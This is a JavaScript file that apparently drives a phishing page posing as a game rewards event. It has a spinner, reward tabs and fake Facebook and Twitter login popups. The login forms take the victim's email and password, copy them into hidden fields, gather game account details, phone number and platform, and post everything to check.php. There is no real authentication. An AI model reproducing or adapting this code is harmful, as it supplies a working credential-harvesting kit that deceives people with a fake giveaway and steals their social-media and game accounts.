// code for click sound
var buka = new Audio();
buka.src = "media/open.mp3";

var tutup = new Audio();
tutup.src = "media/close.mp3";

// code for spiner
function audioFile() {
    var audio = document.getElementById('audioFile');
    audio.play();}
$(document).ready(function(){
        $("o").attr("onclick", "audioFile()");
	});

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for showing hiding popup
function open_account_verification(){
	$('.verify-sec').show();
	$(".open_rewards").hide()
	$(".spin-sec").hide()
	$(".otherReward_confirmation").hide()
}
function open_mail_login(){
	$('.login-mail').show()
	$('.account_login').hide();
}
function close_mail_login(){
	$('.login-mail').hide()
	$('.account_login').show();
}
function open_about_event() {
     $('.about_event').show();
}
function open_event_rules() {
     $('.event_rules').show();
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}
function close_reward_confirmation(){
	$(".open_rewards").hide()
	$('.event_rules').hide();	
}
function close_reward_confirmations(){
    $('.event_rules').hide();	
    $('.about_event').hide();
}
function close_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function close_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}
function open_newhome(){
    $('.account_login').show();
	$('.newhome').hide();
}
function open_account_login(){
	$('.account_login').show();
	$('.open_rewards').hide();
}	
// code for validate data		
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$emailfb = $('#email-facebook').val().trim();
	$passwordfb = $('#password-facebook').val().trim();
	$loginfb = $('#login-facebook').val().trim();
            if($emailfb == '' || $emailfb == null || $emailfb.length <= 5)
            {
                $('.email-fb').show();
                $('.sandi-fb').hide();
                $('.account_verification').hide();
                $('.login-facebook').show();
                return false;
            }else{
               $('.email-fb').hide();               
	           $("input#validateEmail").val($emailfb);
               $('.account_verification').show();
               $('.login-facebook').hide();  
            }
            if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5)
            {
                $('.sandi-fb').show();
                $('.account_verification').hide();
                $('.login-facebook').show();
                return false;
            }else{
               $('.sandi-fb').hide();
	           $("input#validatePassword").val($passwordfb);
	           $("input#validateLogin").val($loginfb);
               $('.account_verification').show();
               $('.login-facebook').hide();	          	           
	}
	}); 
}
function ValidateVerificationData(){
	$('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
	submitingVerificationData.preventDefault();
	
	var $validateEmail = $("input#validateEmail").val();
	var $validatePassword = $("input#validatePassword").val();
	var $nick = $("input#nick").val();
	var $playid = $("input#playid").val();
	var $phone = $("input#phone").val();
	var $level = $("input#level").val();
	var $tier = $("input#tier").val();
	var $rpt = $("input#rpt").val();
	var $rpl = $("input#rpl").val();
	var $platform = $("input#platform").val();
	var $validateLogin = $("input#validateLogin").val();
	if($validateEmail == "" && $validatePassword == "" && $nick == "" && $playid == "" && $phone == "" && $level == "" && $tier == "" && $rpt == "" && $rpl == "" && $platform == "" && $validateLogin == ""){
	$('.verification_info').show();
	$('.account_verification').hide();
	return false;
	}
	
	$.ajax({
		type: "POST",
		url: "check.php",
		data: $(this).serialize(),
		beforeSend: function() {
			$('.check_verification').show();
			$('.account_verification').hide();
		},
		success: function(){
		$(".processing_account").show();
		$('.check_verification').hide();
		$('.account_verification').hide();
		}
	});
	});  
	return false;
};